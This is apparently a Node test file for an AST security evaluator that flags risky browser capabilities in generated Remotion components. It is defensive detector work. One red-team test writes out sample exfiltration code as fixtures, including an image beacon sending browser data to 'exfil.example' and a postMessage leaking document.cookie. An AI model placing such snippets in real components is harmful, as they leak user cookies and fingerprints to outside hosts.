import assert from 'node:assert/strict';
import test from 'node:test';
import {
  PROMPTFRAME_PUBLIC_SECURITY_POLICY_DIGEST,
  evaluatePromptFrameSecurityPolicySource,
} from '../dist/security-policy-evaluator.js';

function ruleIdsFor(source, file = 'src/Component.tsx') {
  return evaluatePromptFrameSecurityPolicySource({ file, source }).findings.map((finding) => finding.ruleId);
}

test('AST evaluator detects direct and aliased forbidden browser globals', () => {
  const source = `
    const Direct = new BroadcastChannel('preview');
    const BC = BroadcastChannel;
    new BC('render');
    const { BroadcastChannel: FromGlobal } = globalThis;
    new FromGlobal('global');
  `;

  assert.ok(ruleIdsFor(source).includes('browser.broadcast_channel'));
});

test('AST evaluator detects member access browser capabilities', () => {
  const source = `
    window['BroadcastChannel']('preview');
    navigator.serviceWorker.register('/sw.js');
    navigator.clipboard.writeText('x');
  `;
  const ruleIds = ruleIdsFor(source);

  assert.ok(ruleIds.includes('browser.broadcast_channel'));
  assert.ok(ruleIds.includes('browser.service_worker'));
  assert.ok(ruleIds.includes('browser.clipboard'));
});

test('AST evaluator detects red-team browser exfiltration and DOM escape vectors', () => {
  const source = `
    export default function Component() {
      const img = new Image();
      img.src = 'https://exfil.example/pixel?ua=' + navigator.userAgent + '&w=' + window.innerWidth;
      const worker = new Worker('/worker.js');
      const shared = new SharedWorker('/shared-worker.js');
      window.open('https://evil.example', '_blank');
      parent.postMessage({ cookie: document.cookie }, '*');
      localStorage.getItem('promptframe');
      document.createElement('script');
      document.createElement('iframe');
      document.body.innerHTML = '<strong>unsafe</strong>';
      return <iframe title="escape" />;
    }
  `;
  const ruleIds = ruleIdsFor(source);

  assert.ok(ruleIds.includes('browser.image_beacon'));
  assert.ok(ruleIds.includes('browser.fingerprint'));
  assert.ok(ruleIds.includes('browser.worker_context'));
  assert.ok(ruleIds.includes('browser.window_open'));
  assert.ok(ruleIds.includes('browser.cross_context_message'));
  assert.ok(ruleIds.includes('storage.browser_storage'));
  assert.ok(ruleIds.includes('browser.dynamic_script'));
  assert.ok(ruleIds.includes('browser.iframe_escape'));
  assert.ok(ruleIds.includes('dom.dangerous_html'));
});

test('AST evaluator detects dynamic import and string timers', () => {
  const source = `
    import(userSuppliedModule);
    setTimeout("alert(1)", 10);
    setInterval('console.log(1)', 100);
  `;
  const ruleIds = ruleIdsFor(source);

  assert.ok(ruleIds.includes('code.dynamic_import'));
  assert.ok(ruleIds.includes('code.string_timer'));
});

test('AST evaluator avoids comments, strings and harmless local symbols', () => {
  const source = `
    // new BroadcastChannel('not real')
    const text = "navigator.serviceWorker.register('/not-real')";
    const BroadcastChannel = 'label only';
    const serviceWorker = { register: () => 'local' };
    const Image = class LocalImage {};
    const Worker = class LocalWorker {};
    const SharedWorker = class LocalSharedWorker {};
    const navigator = { userAgent: 'local', language: 'local' };
    const window = { open: () => undefined, innerWidth: 0 };
    const parent = { postMessage: () => undefined };
    const localStorage = { getItem: () => undefined };
    serviceWorker.register();
    new Image();
    new Worker();
    new SharedWorker();
    navigator.userAgent;
    window.open();
    parent.postMessage();
    localStorage.getItem('x');
  `;

  assert.deepEqual(ruleIdsFor(source), []);
});

test('AST evaluator returns digest and source location metadata', () => {
  const [finding] = evaluatePromptFrameSecurityPolicySource({
    file: 'src/Component.tsx',
    source: `new BroadcastChannel('x');`,
  }).findings;

  assert.equal(finding.ruleId, 'browser.broadcast_channel');
  assert.equal(finding.policyDigest, PROMPTFRAME_PUBLIC_SECURITY_POLICY_DIGEST);
  assert.equal(finding.detectionKind, 'ast');
  assert.equal(finding.confidence, 'high');
  assert.equal(finding.file, 'src/Component.tsx');
  assert.equal(finding.line, 1);
  assert.equal(finding.column, 1);
  assert.ok(finding.evidence?.includes('BroadcastChannel'));
});

test('AST evaluator blocks fps hardcoded timing in Remotion timing contexts', () => {
  const source = `
    import { Sequence, interpolate, spring, useCurrentFrame } from 'remotion';
    export default function Component() {
      const frame = useCurrentFrame();
      const opacity = interpolate(frame, [0, 15, 30], [0, 1, 0]);
      const progress = spring({ frame, fps: 30 });
      return <Sequence from={30} durationInFrames={60}><div style={{ opacity }}>{progress}</div></Sequence>;
    }
  `;

  const findings = evaluatePromptFrameSecurityPolicySource({
    file: 'src/Component.tsx',
    source,
  }).findings.filter((finding) => finding.ruleId === 'runtime.deterministic.fps_hardcoded_timing');

  assert.ok(findings.length >= 3, `expected fps timing findings, got ${findings.length}`);
  assert.ok(findings.every((finding) => finding.action === 'manual_review'));
  assert.ok(findings.every((finding) => finding.severity === 'medium'));
  assert.ok(findings.every((finding) => /secondsToFrames|createRevealPhases|createFillProgress/.test(finding.repairHint ?? '')));
  assert.ok(findings.some((finding) => finding.trace?.some((item) => item.includes('interpolate'))));
  assert.ok(findings.some((finding) => finding.trace?.some((item) => item.includes('jsx'))));
  assert.ok(findings.some((finding) => finding.trace?.some((item) => item.includes('fps'))));
});

test('AST evaluator does not block visual constants or fps-aware helpers', () => {
  const source = `
    import { Sequence, useVideoConfig } from 'remotion';
    import { createFillProgress, createRevealPhases, secondsToFrames } from '@promptframe/component-kit/timing';
    export default function Component() {
      const { fps } = useVideoConfig();
      const duration = secondsToFrames(1, fps);
      const reveal = createRevealPhases({ fps, timeline: { at: (value) => value, holdFrames: 0 }, enterSeconds: 0.2, revealSeconds: 1, exitSeconds: 2 });
      const fill = createFillProgress({ durationFrames: duration, startPercent: 0.2, endPercent: 0.8 });
      const cardWidth = 30;
      const indexes = [0, 1, 2, 3];
      return <Sequence durationInFrames={duration}><div style={{ width: cardWidth, height: 60, opacity: reveal.progressAt(fill.startFrame) }} /></Sequence>;
    }
  `;

  assert.deepEqual(ruleIdsFor(source), []);
});
